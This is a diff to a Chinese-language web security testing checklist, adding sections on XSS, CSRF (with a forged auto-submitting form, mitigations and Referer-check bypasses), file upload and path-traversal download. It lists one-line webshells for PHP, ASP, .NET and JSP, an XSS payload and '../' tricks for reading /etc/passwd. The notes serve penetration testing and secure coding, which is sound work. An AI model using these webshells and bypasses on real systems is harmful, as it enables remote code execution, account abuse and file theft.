@@ -2,6 +2,8 @@
 
 ## XSS
 
+1. 尝试使用`xss"><img src=x onerror=alert(3)>`
+
 ???+ tip
     使用 **AngularJS** 框架的应用, 检查页面元素, 属性中携带`class="ng-binding"`的即为绑定输出, 已经过输出编码, 不存在XSS.
 
@@ -65,6 +67,75 @@ $(document).ready(function(){
 </body>
 </html>
 ```
+
+
+## CSRF
+
+### 受害场景
+
+1. 受害者已登录正常网站，{==SESSIONID==}存放在{==Cookies==}中
+1. 受害者被诱骗用{==同一个浏览器==}打开非法网站
+1. 非法网站存在访问正常网站请求脚本:
+
+    ```html
+    <form action="https://normal.request.action" method="POST" id="csrf_form">
+        <input name="description" value="">
+    </form>
+    <script>
+        var form = document.getElementById("csrf_form");
+        form.submit();
+    </script>
+    ```
+
+### 消减措施
+
+#### 1. Referer
+
+由浏览器添加
+
+服务器校验:
+
+```java
+String referer = request.getHeader("Referer");
+String hostname = request.getLocalName();
+//TODO: compare
+//Warning: 使用contains(), startWith()存在绕过
+```
+
+#### 2. token
+
+1. 认证通过后, 在服务端生成随机数token, 存储在SESSION中, 并发送回客户端(设置Cookies)
+1. 发送请求前, 从Cookies中获取token, 设置在 **请求头/请求体/URL** 中
+1. 接受到请求, 对token进行校验
+
+```java
+String uri = request.getRequestURI();
+//TODO: compare
+//Warning: 使用contains(), startWith()存在绕过
+
+String req_token = request.getHeader("csrf_token");
+String token = (String)request.getSession().getAttribute("csrf_token");
+if(token != null && token.equals(req_token)) {
+    request.doFilter(request, response);
+}
+```
+
+### 验证步骤
+
+!!! info "只针对非GET请求"
+
+1. 查看请求头/请求体/URL中是否存在 **token**, 如:
+    - `roarand: xxx`
+
+    删除/修改token
+    1. 如果对token校验, 尝试 **绕过URL白名单**:
+        - 跨越上层目录: `/logout/../xxx/xxx`
+
+1. 如果没有token, 修改 **Referer**
+    1. 如果对Referer校验, 尝试 **绕过** 使用contains(), startWith()进行的判断：
+        - `http://eval.com?<originhost>`
+        - `http://<originhost>@eval.com`
+        - `http://<originhost>.eval.com`
 
 
 ## SSRF
@@ -328,6 +399,34 @@ public class OSi {
 ### Go
 
 !!! quote "[OS命令注入](../../coding/go/go%E8%AF%AD%E8%A8%80%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/#os)"
+
+
+## OGNL注入
+
+
+## 上传
+
+### 验证步骤
+
+1. 上传一句话木马webshell
+
+    语言 | 代码
+    --- | ---
+    php | `<?php @eval($_POST['passwd']);?>`
+    asp | `<%eval request(“passwd")%>`
+    .net | `<%@ Page Language="Jscript"%><%eval(Request.Item["passwd"],"unsafe");%>`
+    jsp | `<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>`
+
+1. 如果前台校验了后缀名, 抓包修改后缀名
+1. 在路径中添加`../`将webshell上传到可执行目录
+1. 利用客户端连接工具如中国菜刀/蚁剑连接
+
+## 下载
+
+### 验证步骤
+
+1. 文件名或路径可控, 在路径中添加`../`, 下载敏感文件如`/etc/passwd`
+1. 如果文件路径在URL中, 需要进行URL编码`%2e%2e%2f`
 
 
 ## DoS
